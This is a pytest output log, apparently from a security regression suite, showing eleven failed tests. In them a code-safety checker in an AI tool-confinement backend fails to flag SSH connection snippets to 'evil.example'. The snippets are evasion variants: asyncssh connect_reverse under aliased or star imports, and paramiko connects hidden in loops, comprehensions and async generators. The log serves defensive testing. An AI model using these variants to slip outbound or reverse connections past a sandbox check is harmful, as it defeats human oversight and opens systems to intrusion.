@@ -1,0 +1,76 @@
+FFFFFFFFFFF.                                                             [100%]
+=================================== FAILURES ===================================
+_ test_reverse_and_loop_clients_require_approval[import asyncssh; asyncssh.connect_reverse('evil.example',config=None)] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import asyncssh; asyncssh.connect_reverse('evil.example',config=None)", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[from asyncssh import connect_reverse as connect; connect(host='evil.example',config=None)] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from asyncssh import connect_reverse as connect; connect(host='evil.example',config=None)", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[from asyncssh.connection import connect_reverse; connect_reverse('evil.example',config=None)] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from asyncssh.connection import connect_reverse; connect_reverse('evil.example',config=None)", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[from asyncssh import *; connect_reverse('evil.example',config=None)] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from asyncssh import *; connect_reverse('evil.example',config=None)", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[import paramiko\nclients=[paramiko.SSHClient()]\nfor client in clients: client.connect(hostname='evil.example')] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclients=[paramiko.SSHClient()]\nfor client in clients: client.connect(hostname='evil.example')", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[import paramiko\nc=paramiko.SSHClient()\nfor client in [c]: client.connect(hostname='evil.example')\na,b=(1,2)] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nc=paramiko.SSHClient()\nfor client in [c]: client.connect(hostname='evil.example')\na,b=(1,2)", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[import paramiko\nfor client in (paramiko.SSHClient(),): client.connect(hostname='evil.example')] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nfor client in (paramiko.SSHClient(),): client.connect(hostname='evil.example')", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[import paramiko\nfor client,tag in [(paramiko.SSHClient(),1)]: client.connect(hostname='evil.example')] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nfor client,tag in [(paramiko.SSHClient(),1)]: client.connect(hostname='evil.example')", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[import paramiko\nclients=[paramiko.SSHClient()]; pool=clients\nfor client in pool: client.connect(hostname='evil.example')] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nclients=[paramiko.SSHClient()]; pool=clients\nfor client in pool: client.connect(hostname='evil.example')", session_id='review')
+_ test_reverse_and_loop_clients_require_approval[import paramiko\n[client.connect(hostname='evil.example') for client in [paramiko.SSHClient()]]] _
+/evidence/round21_regressions.py:19: in test_reverse_and_loop_clients_require_approval
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\n[client.connect(hostname='evil.example') for client in [paramiko.SSHClient()]]", session_id='review')
+________________ test_async_loop_unknown_iterable_fails_closed _________________
+/evidence/round21_regressions.py:26: in test_async_loop_unknown_iterable_fails_closed
+    assert _check_code_safety(code,session_id='review') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import paramiko\nasync def clients(): yield paramiko.SSHClient()\nasync def main():\n async for client in clients(): client.connect(hostname='evil.example')", session_id='review')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import asyncssh; asyncssh.connect_reverse('evil.example',config=None)]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[from asyncssh import connect_reverse as connect; connect(host='evil.example',config=None)]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[from asyncssh.connection import connect_reverse; connect_reverse('evil.example',config=None)]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[from asyncssh import *; connect_reverse('evil.example',config=None)]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import paramiko\nclients=[paramiko.SSHClient()]\nfor client in clients: client.connect(hostname='evil.example')]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import paramiko\nc=paramiko.SSHClient()\nfor client in [c]: client.connect(hostname='evil.example')\na,b=(1,2)]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import paramiko\nfor client in (paramiko.SSHClient(),): client.connect(hostname='evil.example')]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import paramiko\nfor client,tag in [(paramiko.SSHClient(),1)]: client.connect(hostname='evil.example')]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import paramiko\nclients=[paramiko.SSHClient()]; pool=clients\nfor client in pool: client.connect(hostname='evil.example')]
+FAILED ../evidence/round21_regressions.py::test_reverse_and_loop_clients_require_approval[import paramiko\n[client.connect(hostname='evil.example') for client in [paramiko.SSHClient()]]]
+FAILED ../evidence/round21_regressions.py::test_async_loop_unknown_iterable_fails_closed
+11 failed, 1 passed, 1 warning in 0.14s
